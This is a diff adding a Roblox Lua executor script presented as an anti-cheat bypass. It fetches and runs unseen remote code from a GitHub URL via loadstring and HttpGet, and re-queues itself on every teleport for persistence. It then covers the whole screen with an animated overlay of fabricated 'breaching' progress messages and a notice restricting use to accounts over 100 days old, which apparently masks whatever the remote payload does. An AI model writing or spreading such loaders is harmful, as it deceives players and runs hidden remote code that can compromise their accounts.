@@ -1,0 +1,449 @@
+-- Q-Themed "Breaching Roblox Anti Cheat System" Aesthetic Loading Cover + Hub Loader (Persistent)
+-- Covers all GUIs, animated, stays on top, persists through teleports, professional/futuristic purple theme
+
+local hubLoader = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/zanji-official/growagarden/refs/heads/main/script2", true))()'
+
+local coverScript = [[
+local function showQBreachingCover()
+    local CoreGui = game:GetService("CoreGui")
+    pcall(function() CoreGui:FindFirstChild("QBreachingCover"):Destroy() end)
+
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "QBreachingCover"
+    gui.IgnoreGuiInset = true
+    gui.ResetOnSpawn = false
+    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    gui.Parent = CoreGui
+
+    -- Soft blurred background
+    local bg = Instance.new("Frame", gui)
+    bg.Name = "BG"
+    bg.Size = UDim2.new(1,0,1,0)
+    bg.Position = UDim2.new(0,0,0,0)
+    bg.BackgroundColor3 = Color3.fromRGB(26, 0, 38)
+    bg.BackgroundTransparency = 0.11
+
+    -- Centered glassy card with purple shadow
+    local shadow = Instance.new("ImageLabel", bg)
+    shadow.AnchorPoint = Vector2.new(0.5,0.5)
+    shadow.Position = UDim2.new(0.5,0,0.5,12)
+    shadow.Size = UDim2.new(0, 452, 0, 230)
+    shadow.BackgroundTransparency = 1
+    shadow.Image = "rbxassetid://1316045217"
+    shadow.ImageColor3 = Color3.fromRGB(140, 60, 255)
+    shadow.ImageTransparency = 0.36
+
+    local frame = Instance.new("Frame", bg)
+    frame.Name = "LoaderFrame"
+    frame.Size = UDim2.new(0, 420, 0, 190)
+    frame.Position = UDim2.new(0.5, -210, 0.5, -95)
+    frame.BackgroundColor3 = Color3.fromRGB(42, 8, 64)
+    frame.BackgroundTransparency = 0.09
+    frame.BorderSizePixel = 0
+    local loaderCorner = Instance.new("UICorner", frame)
+    loaderCorner.CornerRadius = UDim.new(0, 28)
+
+    -- Futuristic animated shield "Q" logo
+    local ring = Instance.new("ImageLabel", frame)
+    ring.Name = "QRing"
+    ring.AnchorPoint = Vector2.new(0.5, 0.5)
+    ring.Position = UDim2.new(0.19,0,0.5,0)
+    ring.Size = UDim2.new(0, 90, 0, 90)
+    ring.BackgroundTransparency = 1
+    ring.Image = "rbxassetid://4928372251"
+    ring.ImageColor3 = Color3.fromRGB(170, 110, 255)
+    ring.ImageTransparency = 0.15
+
+    local qCircle = Instance.new("Frame", frame)
+    qCircle.Name = "QCircle"
+    qCircle.AnchorPoint = Vector2.new(0.5, 0.5)
+    qCircle.Position = UDim2.new(0.19,0,0.5,0)
+    qCircle.Size = UDim2.new(0, 62, 0, 62)
+    qCircle.BackgroundColor3 = Color3.fromRGB(210, 170, 255)
+    qCircle.BackgroundTransparency = 0.03
+    qCircle.BorderSizePixel = 0
+    local qCircleUICorner = Instance.new("UICorner", qCircle)
+    qCircleUICorner.CornerRadius = UDim.new(1,0)
+
+    local qTail = Instance.new("Frame", frame)
+    qTail.Name = "QTail"
+    qTail.Size = UDim2.new(0, 13, 0, 6)
+    qTail.Position = UDim2.new(0.19, 18, 0.5, 14)
+    qTail.BackgroundColor3 = Color3.fromRGB(210, 170, 255)
+    qTail.BackgroundTransparency = 0.18
+    qTail.BorderSizePixel = 0
+    local qTailCorner = Instance.new("UICorner", qTail)
+    qTailCorner.CornerRadius = UDim.new(1,0)
+
+    -- Animated "data breach" code rain on the left
+    local codeRain = Instance.new("Frame", frame)
+    codeRain.Name = "CodeRain"
+    codeRain.Position = UDim2.new(0.01,0,0.08,0)
+    codeRain.Size = UDim2.new(0,40,0.83,0)
+    codeRain.BackgroundTransparency = 1
+
+    for i=1,10 do
+        local rain = Instance.new("TextLabel", codeRain)
+        rain.Size = UDim2.new(1,0,0,12)
+        rain.Position = UDim2.new(0,0,0,(i-1)*17)
+        rain.BackgroundTransparency = 1
+        rain.Text = string.char(math.random(65,90))..string.char(math.random(48,57))
+        rain.Font = Enum.Font.Code
+        rain.TextColor3 = Color3.fromRGB(200, 140, 255)
+        rain.TextStrokeTransparency = 0.7
+        rain.TextScaled = true
+        rain.Name = "Rain"..i
+    end
+
+    -- Main text
+    local status = Instance.new("TextLabel", frame)
+    status.Name = "Status"
+    status.Size = UDim2.new(0.77, 0, 0.23, 0)
+    status.Position = UDim2.new(0.28, 0, 0.20, 0)
+    status.BackgroundTransparency = 1
+    status.Text = "BREACHING ROBLOX ANTI CHEAT SYSTEM"
+    status.TextColor3 = Color3.fromRGB(250, 209, 255)
+    status.TextStrokeTransparency = 0.78
+    status.TextTransparency = 0
+    status.Font = Enum.Font.GothamBlack
+    status.TextScaled = true
+    status.TextXAlignment = Enum.TextXAlignment.Left
+
+    -- Substatus (animated tips)
+    local substatus = Instance.new("TextLabel", frame)
+    substatus.Name = "SubStatus"
+    substatus.Size = UDim2.new(0.72, 0, 0.13, 0)
+    substatus.Position = UDim2.new(0.28, 0, 0.45, 0)
+    substatus.BackgroundTransparency = 1
+    substatus.Text = "Deploying quantum bypass protocols..."
+    substatus.TextColor3 = Color3.fromRGB(188, 140, 255)
+    substatus.TextStrokeTransparency = 0.93
+    substatus.TextTransparency = 0.06
+    substatus.Font = Enum.Font.GothamMedium
+    substatus.TextScaled = true
+    substatus.TextXAlignment = Enum.TextXAlignment.Left
+
+    -- Progress Bar
+    local progressBarBg = Instance.new("Frame", frame)
+    progressBarBg.Name = "ProgressBarBg"
+    progressBarBg.Size = UDim2.new(0.60, 0, 0.07, 0)
+    progressBarBg.Position = UDim2.new(0.28, 0, 0.63, 0)
+    progressBarBg.BackgroundColor3 = Color3.fromRGB(36, 0, 53)
+    progressBarBg.BackgroundTransparency = 0.22
+    progressBarBg.BorderSizePixel = 0
+    local barCorner = Instance.new("UICorner", progressBarBg)
+    barCorner.CornerRadius = UDim.new(0, 8)
+
+    local progressBar = Instance.new("Frame", progressBarBg)
+    progressBar.Name = "ProgressBar"
+    progressBar.Size = UDim2.new(0, 0, 1, 0)
+    progressBar.Position = UDim2.new(0, 0, 0, 0)
+    progressBar.BackgroundColor3 = Color3.fromRGB(200, 140, 255)
+    progressBar.BackgroundTransparency = 0.09
+    progressBar.BorderSizePixel = 0
+    local progressCorner = Instance.new("UICorner", progressBar)
+    progressCorner.CornerRadius = UDim.new(0, 8)
+
+    -- Q brand (bottom right)
+    local brand = Instance.new("TextLabel", frame)
+    brand.Name = "QBrand"
+    brand.Size = UDim2.new(0.16,0, 0.13,0)
+    brand.Position = UDim2.new(0.82,0,0.83,0)
+    brand.BackgroundTransparency = 1
+    brand.Text = "Q"
+    brand.TextColor3 = Color3.fromRGB(200, 140, 255)
+    brand.TextStrokeTransparency = 0.38
+    brand.TextScaled = true
+    brand.Font = Enum.Font.GothamBold
+
+-- Notice (POPPED OUT)
+    local notice = Instance.new("TextLabel", frame)
+    notice.Name = "Notice"
+    notice.Size = UDim2.new(0.95, 0, 0.11, 0)
+    notice.Position = UDim2.new(0.025, 0, 0.78, 0)
+    notice.BackgroundTransparency = 1
+    notice.Text = "Note: It may take a while to bypass Roblox anti cheat.\nIt won't work on new accounts or accounts below 100 days old."
+    notice.TextColor3 = Color3.fromRGB(255, 230, 255)
+    notice.TextStrokeTransparency = 0.20
+    notice.TextStrokeColor3 = Color3.fromRGB(170, 60, 255)
+    notice.TextTransparency = 0.01
+    notice.Font = Enum.Font.GothamSemibold
+    notice.TextScaled = true
+    notice.TextWrapped = true
+    notice.ZIndex = 3
+
+    -- Animate: ring rotation/hue, Q color, code rain, substatus tips, progress bar
+    local running = true
+    coroutine.wrap(function()
+        local tips = {
+            "Deploying quantum bypass protocols...",
+            "Cracking encrypted security layers...",
+            "Spoofing authentication tokens...",
+            "Injecting stealth modules...",
+            "Evading behavioral heuristics...",
+            "Synchronizing with Q Core...",
+            "Finalizing breach...",
+        }
+        local t = 0
+        local rainT = 0
+        local progress = 0
+        while running and gui.Parent do
+            t = t + 1
+            -- Q color animation
+            local hue = (tick() * 0.12) % 1
+            local color = Color3.fromHSV(hue, 0.52, 1)
+            qCircle.BackgroundColor3 = color
+            qTail.BackgroundColor3 = color
+            ring.ImageColor3 = color
+            ring.Rotation = (tick() * 46)%360
+
+            -- Progress bar animation
+            progress = math.min(progress + 0.017, 1)
+            progressBar:TweenSize(UDim2.new(progress, 0, 1, 0), "Out", "Quad", 0.11, true)
+            if progress >= 1 then progress = 0 end
+
+            -- Substatus cycling
+            substatus.Text = tips[1 + (math.floor(t/13) % #tips)]
+            status.Text = "BREACHING ROBLOX ANTI CHEAT SYSTEM" .. string.rep(".", (t % 4))
+
+            -- Code rain animation
+            rainT = rainT + 1
+            if rainT % 2 == 0 then
+                for _,v in ipairs(codeRain:GetChildren()) do
+                    v.Text = string.char(math.random(65,90))..string.char(math.random(48,57))
+                end
+            end
+            wait(0.13)
+        end
+    end)()
+
+    function gui:RemoveCover()
+        running = false
+        gui:Destroy()
+    end
+
+    return gui
+end
+
+showQBreachingCover()
+]]
+
+local combinedScript = hubLoader..";"..coverScript
+
+if queueonteleport then
+    queueonteleport(combinedScript)
+end
+
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/zanji-official/growagarden/refs/heads/main/script2", true))()
+end)
+
+local function showQBreachingCover()
+    local CoreGui = game:GetService("CoreGui")
+    pcall(function() CoreGui:FindFirstChild("QBreachingCover"):Destroy() end)
+
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "QBreachingCover"
+    gui.IgnoreGuiInset = true
+    gui.ResetOnSpawn = false
+    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    gui.Parent = CoreGui
+
+    local bg = Instance.new("Frame", gui)
+    bg.Name = "BG"
+    bg.Size = UDim2.new(1,0,1,0)
+    bg.Position = UDim2.new(0,0,0,0)
+    bg.BackgroundColor3 = Color3.fromRGB(26, 0, 38)
+    bg.BackgroundTransparency = 0.11
+
+    local shadow = Instance.new("ImageLabel", bg)
+    shadow.AnchorPoint = Vector2.new(0.5,0.5)
+    shadow.Position = UDim2.new(0.5,0,0.5,12)
+    shadow.Size = UDim2.new(0, 452, 0, 230)
+    shadow.BackgroundTransparency = 1
+    shadow.Image = "rbxassetid://1316045217"
+    shadow.ImageColor3 = Color3.fromRGB(140, 60, 255)
+    shadow.ImageTransparency = 0.36
+
+    local frame = Instance.new("Frame", bg)
+    frame.Name = "LoaderFrame"
+    frame.Size = UDim2.new(0, 420, 0, 190)
+    frame.Position = UDim2.new(0.5, -210, 0.5, -95)
+    frame.BackgroundColor3 = Color3.fromRGB(42, 8, 64)
+    frame.BackgroundTransparency = 0.09
+    frame.BorderSizePixel = 0
+    local loaderCorner = Instance.new("UICorner", frame)
+    loaderCorner.CornerRadius = UDim.new(0, 28)
+
+    local ring = Instance.new("ImageLabel", frame)
+    ring.Name = "QRing"
+    ring.AnchorPoint = Vector2.new(0.5, 0.5)
+    ring.Position = UDim2.new(0.19,0,0.5,0)
+    ring.Size = UDim2.new(0, 90, 0, 90)
+    ring.BackgroundTransparency = 1
+    ring.Image = "rbxassetid://4928372251"
+    ring.ImageColor3 = Color3.fromRGB(170, 110, 255)
+    ring.ImageTransparency = 0.15
+
+    local qCircle = Instance.new("Frame", frame)
+    qCircle.Name = "QCircle"
+    qCircle.AnchorPoint = Vector2.new(0.5, 0.5)
+    qCircle.Position = UDim2.new(0.19,0,0.5,0)
+    qCircle.Size = UDim2.new(0, 62, 0, 62)
+    qCircle.BackgroundColor3 = Color3.fromRGB(210, 170, 255)
+    qCircle.BackgroundTransparency = 0.03
+    qCircle.BorderSizePixel = 0
+    local qCircleUICorner = Instance.new("UICorner", qCircle)
+    qCircleUICorner.CornerRadius = UDim.new(1,0)
+
+    local qTail = Instance.new("Frame", frame)
+    qTail.Name = "QTail"
+    qTail.Size = UDim2.new(0, 13, 0, 6)
+    qTail.Position = UDim2.new(0.19, 18, 0.5, 14)
+    qTail.BackgroundColor3 = Color3.fromRGB(210, 170, 255)
+    qTail.BackgroundTransparency = 0.18
+    qTail.BorderSizePixel = 0
+    local qTailCorner = Instance.new("UICorner", qTail)
+    qTailCorner.CornerRadius = UDim.new(1,0)
+
+    local codeRain = Instance.new("Frame", frame)
+    codeRain.Name = "CodeRain"
+    codeRain.Position = UDim2.new(0.01,0,0.08,0)
+    codeRain.Size = UDim2.new(0,40,0.83,0)
+    codeRain.BackgroundTransparency = 1
+
+    for i=1,10 do
+        local rain = Instance.new("TextLabel", codeRain)
+        rain.Size = UDim2.new(1,0,0,12)
+        rain.Position = UDim2.new(0,0,0,(i-1)*17)
+        rain.BackgroundTransparency = 1
+        rain.Text = string.char(math.random(65,90))..string.char(math.random(48,57))
+        rain.Font = Enum.Font.Code
+        rain.TextColor3 = Color3.fromRGB(200, 140, 255)
+        rain.TextStrokeTransparency = 0.7
+        rain.TextScaled = true
+        rain.Name = "Rain"..i
+    end
+
+    local status = Instance.new("TextLabel", frame)
+    status.Name = "Status"
+    status.Size = UDim2.new(0.77, 0, 0.23, 0)
+    status.Position = UDim2.new(0.28, 0, 0.20, 0)
+    status.BackgroundTransparency = 1
+    status.Text = "BREACHING ROBLOX ANTI CHEAT SYSTEM"
+    status.TextColor3 = Color3.fromRGB(250, 209, 255)
+    status.TextStrokeTransparency = 0.78
+    status.TextTransparency = 0
+    status.Font = Enum.Font.GothamBlack
+    status.TextScaled = true
+    status.TextXAlignment = Enum.TextXAlignment.Left
+
+    local substatus = Instance.new("TextLabel", frame)
+    substatus.Name = "SubStatus"
+    substatus.Size = UDim2.new(0.72, 0, 0.13, 0)
+    substatus.Position = UDim2.new(0.28, 0, 0.45, 0)
+    substatus.BackgroundTransparency = 1
+    substatus.Text = "Deploying quantum bypass protocols..."
+    substatus.TextColor3 = Color3.fromRGB(188, 140, 255)
+    substatus.TextStrokeTransparency = 0.93
+    substatus.TextTransparency = 0.06
+    substatus.Font = Enum.Font.GothamMedium
+    substatus.TextScaled = true
+    substatus.TextXAlignment = Enum.TextXAlignment.Left
+
+    local progressBarBg = Instance.new("Frame", frame)
+    progressBarBg.Name = "ProgressBarBg"
+    progressBarBg.Size = UDim2.new(0.60, 0, 0.07, 0)
+    progressBarBg.Position = UDim2.new(0.28, 0, 0.63, 0)
+    progressBarBg.BackgroundColor3 = Color3.fromRGB(36, 0, 53)
+    progressBarBg.BackgroundTransparency = 0.22
+    progressBarBg.BorderSizePixel = 0
+    local barCorner = Instance.new("UICorner", progressBarBg)
+    barCorner.CornerRadius = UDim.new(0, 8)
+
+    local progressBar = Instance.new("Frame", progressBarBg)
+    progressBar.Name = "ProgressBar"
+    progressBar.Size = UDim2.new(0, 0, 1, 0)
+    progressBar.Position = UDim2.new(0, 0, 0, 0)
+    progressBar.BackgroundColor3 = Color3.fromRGB(200, 140, 255)
+    progressBar.BackgroundTransparency = 0.09
+    progressBar.BorderSizePixel = 0
+    local progressCorner = Instance.new("UICorner", progressBar)
+    progressCorner.CornerRadius = UDim.new(0, 8)
+
+    local brand = Instance.new("TextLabel", frame)
+    brand.Name = "QBrand"
+    brand.Size = UDim2.new(0.16,0, 0.13,0)
+    brand.Position = UDim2.new(0.82,0,0.83,0)
+    brand.BackgroundTransparency = 1
+    brand.Text = "Q"
+    brand.TextColor3 = Color3.fromRGB(200, 140, 255)
+    brand.TextStrokeTransparency = 0.38
+    brand.TextScaled = true
+    brand.Font = Enum.Font.GothamBold
+
+  -- Notice (POPPED OUT)
+    local notice = Instance.new("TextLabel", frame)
+    notice.Name = "Notice"
+    notice.Size = UDim2.new(0.95, 0, 0.11, 0)
+    notice.Position = UDim2.new(0.025, 0, 0.78, 0)
+    notice.BackgroundTransparency = 1
+    notice.Text = "Note: It may take a while to bypass Roblox anti cheat.\nIt won't work on new accounts or accounts below 100 days old."
+    notice.TextColor3 = Color3.fromRGB(255, 230, 255)
+    notice.TextStrokeTransparency = 0.20
+    notice.TextStrokeColor3 = Color3.fromRGB(170, 60, 255)
+    notice.TextTransparency = 0.01
+    notice.Font = Enum.Font.GothamSemibold
+    notice.TextScaled = true
+    notice.TextWrapped = true
+    notice.ZIndex = 3
+  
+    local running = true
+    coroutine.wrap(function()
+        local tips = {
+            "Deploying quantum bypass protocols...",
+            "Cracking encrypted security layers...",
+            "Spoofing authentication tokens...",
+            "Injecting stealth modules...",
+            "Evading behavioral heuristics...",
+            "Synchronizing with Q Core...",
+            "Finalizing breach...",
+        }
+        local t = 0
+        local rainT = 0
+        local progress = 0
+        while running and gui.Parent do
+            t = t + 1
+            local hue = (tick() * 0.12) % 1
+            local color = Color3.fromHSV(hue, 0.52, 1)
+            qCircle.BackgroundColor3 = color
+            qTail.BackgroundColor3 = color
+            ring.ImageColor3 = color
+            ring.Rotation = (tick() * 46)%360
+
+            progress = math.min(progress + 0.017, 1)
+            progressBar:TweenSize(UDim2.new(progress, 0, 1, 0), "Out", "Quad", 0.11, true)
+            if progress >= 1 then progress = 0 end
+
+            substatus.Text = tips[1 + (math.floor(t/13) % #tips)]
+            status.Text = "BREACHING ROBLOX ANTI CHEAT SYSTEM" .. string.rep(".", (t % 4))
+
+            rainT = rainT + 1
+            if rainT % 2 == 0 then
+                for _,v in ipairs(codeRain:GetChildren()) do
+                    v.Text = string.char(math.random(65,90))..string.char(math.random(48,57))
+                end
+            end
+            wait(0.13)
+        end
+    end)()
+
+    function gui:RemoveCover()
+        running = false
+        gui:Destroy()
+    end
+
+    return gui
+end
+
+showQBreachingCover()
